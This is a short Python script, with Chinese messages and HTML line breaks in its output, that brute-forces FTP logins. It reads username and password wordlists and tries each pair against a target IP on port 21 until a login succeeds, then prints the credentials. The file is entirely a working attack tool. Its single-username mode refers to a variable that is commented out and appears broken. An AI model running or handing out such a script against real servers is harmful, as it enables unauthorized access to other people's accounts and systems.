# encoding: utf-8
from ftplib import FTP
import argparse
def UserDictionary():
    try:
        user=open('user.txt','r')
        #print("打开用户字典成功<br>")
        return user
    except Exception:
        print("未找到用户字典(默认为user.txt)<br>")
        exit()
        
def PasswordDictionary():
    try:
        password=open('password.txt','r')
        #print("打开密码字典成功<br>")
        return password
    except Exception:
        print("未找到密码字典(默认为password.txt)<br>")
        exit()
def GetPass(ftp,user,password):
    try:
        ftp.login(user,password)
        print("用户名：%s"%user)
        print("密码：%s"%password)
        return True
    except Exception:
        return False
print("FTP暴力破解<br>")
# print('''1.用户名+密码字典
# 2.用户名字典+密码字典''')
# Patterns=int(input("请选择模式："))
 
# if Patterns==1:
#     #user=input("用户名：")
#     passwords=PasswordDictionary().readlines()
# elif Patterns==2:
#     users=UserDictionary().readlines()
#     passwords=PasswordDictionary().readlines()
# else:
#     print("输入错误！")
#     exit()

def ftpboom(IP,Patterns):
    if Patterns==1:
        #user=input("用户名：")
        passwords=PasswordDictionary().readlines()
    elif Patterns==2:
        users=UserDictionary().readlines()
        passwords=PasswordDictionary().readlines()
    else:
        print("输入错误！")
        exit()
    ftp=FTP()
    Port=21
    #IP=input("ip:")        
    print("连接%s中..."%IP + "<br>")
    try :
        ftp.connect(IP,Port)
        print("连接成功<br>")
    except Exception:
        print("连接失败<br>")
        exit()
    if Patterns==1:
        for password in passwords:
            password=password.strip()
            print("测试密码:%s"%password+"<br>")
            if(GetPass(ftp,user, password)):
                exit()
    elif Patterns==2:
        for user in users:
            for password in passwords:
                user=user.strip()
                password=password.strip()
                print("测试用户和密码{user:%s|password;%s}"%(user,password)+"<br>")
                if(GetPass(ftp,user, password)):
                    exit()
    print("用户名或密码不在字典中<br>")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-I', '--IP', type=str)
    parser.add_argument('-P', '--Patterns', type=int)
    # parser.add_argument('-u', '--yhzd', type=str)
    # parser.add_argument('-p', '--mmzd', type=str)
    args = parser.parse_args()
    print(ftpboom(args.IP,args.Patterns))